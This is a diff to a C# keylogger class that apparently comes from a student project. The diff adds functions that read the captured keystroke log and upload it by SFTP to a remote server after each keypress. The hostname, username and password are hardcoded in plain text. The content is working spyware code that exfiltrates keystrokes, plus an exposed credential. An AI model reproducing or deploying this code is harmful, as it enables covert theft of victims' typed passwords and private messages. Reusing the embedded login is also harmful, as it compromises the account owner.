@@ -3,6 +3,7 @@ using System.Diagnostics;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.IO;
+using Renci.SshNet;
 
 class InterceptKeys
 {
@@ -45,10 +46,12 @@ class InterceptKeys
     }
 
     private static void writeToFile(Keys p)
-    {
+    { 
         char key = Convert.ToChar(p);
         if (key == 32)
             key = ' ';
+        else if (key == 13)
+            key = '\n';
        // else if (key == )
 
 
@@ -59,6 +62,33 @@ class InterceptKeys
             {
                 writer.Write(key.ToString());
             }
+        }
+
+        copyFileToServer(readBytesFromFile());
+    }
+
+    private static Stream readBytesFromFile()
+    {
+        FileStream fileStream = new FileStream("log.txt", FileMode.Open);
+        return fileStream;
+    }
+
+
+    private static void copyFileToServer(Stream fileStream)
+    {
+        string hostname = "et791.eng.utoledo.edu";
+        string username = "kglosse";
+        string password = "kglosseCSET3100";
+        int port = 22;
+
+        using (var client = new SftpClient(hostname, username, password))
+        {
+            client.Connect(); // find the execption message
+
+            client.UploadFile(fileStream, "/home/kglosse/cset4850/logs/", true, null);
+
+            
+            client.Disconnect();
         }
     }
 
